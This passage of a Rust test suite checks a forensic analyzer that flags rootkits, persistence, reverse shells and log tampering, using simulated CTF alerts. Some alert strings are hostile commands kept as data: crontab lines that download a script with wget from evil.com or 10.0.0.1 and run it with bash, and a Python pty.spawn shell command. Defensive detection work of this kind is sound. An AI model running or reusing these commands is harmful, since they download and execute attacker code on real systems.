        let result = analyze_malware_tools(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Inconclusive);
        assert!(!result.findings.is_empty());
    }

    // ── Rootkit present tests ───────────────────────────────────

    #[test]
    fn rootkit_detects_chkrootkit_infected() {
        let alerts = vec![alert(
            AlertSeverity::Critical,
            "malware",
            "chkrootkit INFECTED: diamorphine",
            "diamorphine found",
        )];
        let result = analyze_rootkit_present(&alerts);
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.confidence >= 0.9);
        assert!(result.interpretation.contains("diamorphine"));
        assert!(result.mitre_techniques.contains(&"T1014"));
    }

    #[test]
    fn rootkit_detects_unattributed_connections() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "network",
            "Unattributed LISTEN connection (no PID — possible process hiding)",
            "proto=tcp local=0.0.0.0:4444",
        )];
        let result = analyze_rootkit_present(&alerts);
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("process hiding"));
    }

    #[test]
    fn rootkit_detects_ld_preload() {
        let alerts = vec![alert(
            AlertSeverity::Critical,
            "config",
            "ld.so.preload is non-empty (potential shared-library hijack)",
            "/usr/lib/libprocesshider.so",
        )];
        let result = analyze_rootkit_present(&alerts);
        assert_eq!(result.answer, Answer::Yes);
    }

    #[test]
    fn rootkit_no_on_empty() {
        let result = analyze_rootkit_present(&[]);
        assert_eq!(result.answer, Answer::No);
        assert_eq!(result.confidence, 0.0);
    }

    // ── Resource abuse tests ────────────────────────────────────

    #[test]
    fn resource_abuse_cryptominer_pattern() {
        let alerts = vec![
            alert(
                AlertSeverity::Critical,
                "malware",
                "chkrootkit INFECTED: diamorphine",
                "found",
            ),
            alert(
                AlertSeverity::Warning,
                "network",
                "Unattributed LISTEN connection (no PID — possible process hiding)",
                "proto=tcp",
            ),
        ];
        let result = analyze_resource_abuse(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("cryptominer"));
    }

    #[test]
    fn resource_abuse_no_without_rootkit() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "network",
            "External connection to 1.2.3.4",
            "details",
        )];
        let result = analyze_resource_abuse(&alerts, &empty_input());
        // Just an external connection without rootkit is inconclusive at best
        assert_ne!(result.answer, Answer::Yes);
    }

    // ── Persistence tests ───────────────────────────────────────

    #[test]
    fn persistence_detects_crontab() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "config",
            "Suspicious crontab command (wget)",
            "schedule=*/5 user=root cmd=wget http://evil.com/payload",
        )];
        let result = analyze_persistence(&alerts, &empty_input());
        assert!(result.answer == Answer::Inconclusive || result.answer == Answer::Yes);
        assert!(!result.findings.is_empty());
    }

    #[test]
    fn persistence_detects_ld_preload_as_persistence() {
        let alerts = vec![alert(
            AlertSeverity::Critical,
            "config",
            "ld.so.preload is non-empty (potential shared-library hijack)",
            "/usr/lib/libhide.so",
        )];
        let result = analyze_persistence(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("persistence"));
    }

    #[test]
    fn persistence_detects_authorized_keys() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "config",
            "Unusual authorized_keys entry",
            "ssh-rsa AAAA...",
        )];
        let result = analyze_persistence(&alerts, &empty_input());
        assert!(!result.findings.is_empty());
    }

    // ── Active access tests ─────────────────────────────────────

    #[test]
    fn active_access_detects_reverse_shell() {
        let alerts = vec![alert(
            AlertSeverity::Critical,
            "process",
            "Reverse shell indicator: pty.spawn",
            "pid=999",
        )];
        let result = analyze_active_access(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("active reverse shell"));
        assert!(result.interpretation.contains("immediate containment"));
    }

    #[test]
    fn active_access_no_on_empty() {
        let result = analyze_active_access(&[], &empty_input());
        assert_eq!(result.answer, Answer::No);
    }

    // ── Hidden processes tests ──────────────────────────────────

    #[test]
    fn hidden_processes_from_unattributed() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "network",
            "Unattributed ESTAB connection (no PID — possible process hiding)",
            "proto=tcp local=0.0.0.0:4444",
        )];
        let result = analyze_hidden_processes(&alerts);
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("kernel-level rootkit"));
    }

    #[test]
    fn hidden_processes_no_on_normal_connections() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "network",
            "External connection to 8.8.8.8",
            "details",
        )];
        let result = analyze_hidden_processes(&alerts);
        assert_eq!(result.answer, Answer::No);
    }

    // ── Evidence tampering tests ────────────────────────────────

    #[test]
    fn evidence_tampering_detects_log_clearing() {
        let alerts = vec![alert(
            AlertSeverity::Critical,
            "windows-integrity",
            "Security log cleared (EventID:1102)",
            "details",
        )];
        let result = analyze_evidence_tampering(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("anti-forensic"));
    }

    #[test]
    fn evidence_tampering_detects_audit_policy_change() {
        let alerts = vec![alert(
            AlertSeverity::Warning,
            "windows-integrity",
            "Audit policy changed (EventID:4719)",
            "details",
        )];
        let result = analyze_evidence_tampering(&alerts, &empty_input());
        assert!(result.answer == Answer::Yes || result.answer == Answer::Inconclusive);
    }

    // ── Attack timeline tests ───────────────────────────────────

    #[test]
    fn attack_timeline_with_significant_alerts() {
        let alerts = vec![
            alert(
                AlertSeverity::Critical,
                "rootkit",
                "chkrootkit INFECTED: diamorphine",
                "found",
            ),
            alert(
                AlertSeverity::Warning,
                "config",
                "Suspicious crontab command (wget)",
                "details",
            ),
            alert(
                AlertSeverity::Critical,
                "process",
                "Reverse shell indicator: pty.spawn",
                "pid=999",
            ),
        ];
        let result = analyze_attack_timeline(&alerts, &empty_input());
        assert_eq!(result.answer, Answer::Yes);
        assert!(result.interpretation.contains("3 significant findings"));
    }

    #[test]
    fn attack_timeline_includes_bodyfile_count() {
        let bf = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/test".into(),
            inode: 0,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1_700_000_000),
            mtime: Some(1_700_000_000),
            ctime: Some(1_700_000_000),
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &bf,
            ..empty_input()
        };
        let result = analyze_attack_timeline(&[], &input);
        assert!(result
            .findings
            .iter()
            .any(|f| f.evidence.contains("1 bodyfile entries")));
    }

    // ── Full integration test ───────────────────────────────────

    #[test]
    fn full_ctf_scenario_produces_comprehensive_analysis() {
        // Simulate the Hal Pomeranz CTF scenario alerts
        let alerts = vec![
            // Reverse shell (SOC alert trigger)
            alert(AlertSeverity::Critical, "process", "Reverse shell indicator: pty.spawn", "pid=999 user=worker cmd=python3 -c import pty; pty.spawn(\"/bin/bash\")"),
            // Rootkit
            alert(AlertSeverity::Critical, "malware", "chkrootkit INFECTED: diamorphine", "diamorphine LKM rootkit"),
            alert(AlertSeverity::Critical, "malware", "[known_rootkit_module] diamorphine: known rootkit kernel module", "lsmod output"),
            // Process hiding
            alert(AlertSeverity::Warning, "network", "Unattributed LISTEN connection (no PID — possible process hiding)", "proto=tcp local=0.0.0.0:4444 remote=*:*"),
            // ld.so.preload
            alert(AlertSeverity::Critical, "config", "ld.so.preload is non-empty (potential shared-library hijack)", "/usr/lib/libprocesshider.so"),
            // Persistence
            alert(AlertSeverity::Warning, "config", "Suspicious crontab command (wget)", "schedule=*/5 * * * * user=root cmd=wget -q http://10.0.0.1/update.sh -O /tmp/.update && bash /tmp/.update"),
            // External connection
            alert(AlertSeverity::Warning, "network", "External connection to 10.0.0.1", "local=192.168.4.50:43210 remote=10.0.0.1:4444 state=ESTABLISHED"),
            // Compound rootkit
            alert(AlertSeverity::Critical, "malware", "Compound rootkit evidence: rootkit module + unattributed network + crontab persistence", "3 corroborating signals"),
        ];

        let results = analyze(&alerts, &empty_input());

        // Should answer all 11 questions
        assert_eq!(results.len(), 11);

        // System compromised: YES
        let compromised = results
            .iter()
            .find(|r| r.question_id == "system_compromised")
            .unwrap();
        assert_eq!(compromised.answer, Answer::Yes);
        assert!(compromised.confidence >= 0.9);

        // Rootkit present: YES with diamorphine name
        let rootkit = results
            .iter()
            .find(|r| r.question_id == "rootkit_present")
            .unwrap();
        assert_eq!(rootkit.answer, Answer::Yes);
        assert!(rootkit.interpretation.contains("diamorphine"));

        // Active access: YES (reverse shell)
        let access = results
            .iter()
            .find(|r| r.question_id == "active_access")
            .unwrap();
        assert_eq!(access.answer, Answer::Yes);
        assert!(access.interpretation.contains("reverse shell"));

        // Hidden processes: YES
        let hidden = results
            .iter()
            .find(|r| r.question_id == "hidden_processes")
            .unwrap();
        assert_eq!(hidden.answer, Answer::Yes);

        // Resource abuse: YES (rootkit + hidden processes = cryptominer pattern)
        let abuse = results
            .iter()
            .find(|r| r.question_id == "resource_abuse")
            .unwrap();
        assert_eq!(abuse.answer, Answer::Yes);
        assert!(abuse.interpretation.contains("cryptominer"));

        // Persistence: YES
        let persist = results
            .iter()
            .find(|r| r.question_id == "persistence_established")
            .unwrap();
        assert_eq!(persist.answer, Answer::Yes);

        // Timeline: YES (has significant alerts)
        let timeline = results
            .iter()
            .find(|r| r.question_id == "attack_timeline")
            .unwrap();
        assert_eq!(timeline.answer, Answer::Yes);

        // Results should be sorted by tier
        for window in results.windows(2) {
            assert!(window[0].tier <= window[1].tier);
        }
    }
}
